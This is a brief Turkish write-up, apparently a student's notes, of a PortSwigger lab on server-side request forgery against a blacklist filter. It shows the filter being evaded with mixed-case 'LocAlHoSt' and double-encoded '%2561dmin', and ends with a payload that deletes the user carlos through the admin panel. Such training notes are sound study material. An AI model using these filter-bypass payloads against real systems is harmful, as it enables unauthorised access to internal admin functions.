@@ -1,0 +1,20 @@
+Lab: SSRF with blacklist-based input filter
+url: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
+
+
+Analiz:
+
+-- İstek içindeki yükü manipüle etmek için http://localhost/admin denedik fakat sitenin bize mesajı;
+            
+            "External stock check blocked for security reasons"
+
+-- Blocklu karakterlerin yerini doldurmak için 
+        http://LocAlHoSt  ile doğru sonucu aldık.
+        http://LocAlHoSt/%2561dmin ile birleştirdik ve admin panele erişim kazandık
+
+-- Admin panelin içerisindeki url ile http://LocAlHoSt/%2561dmin payloadını birleştirerek
+carlosu sildik.
+
+Nihai komut:
+
+        http://LocAlHoSt/%2561dmin/delete?username=carlos
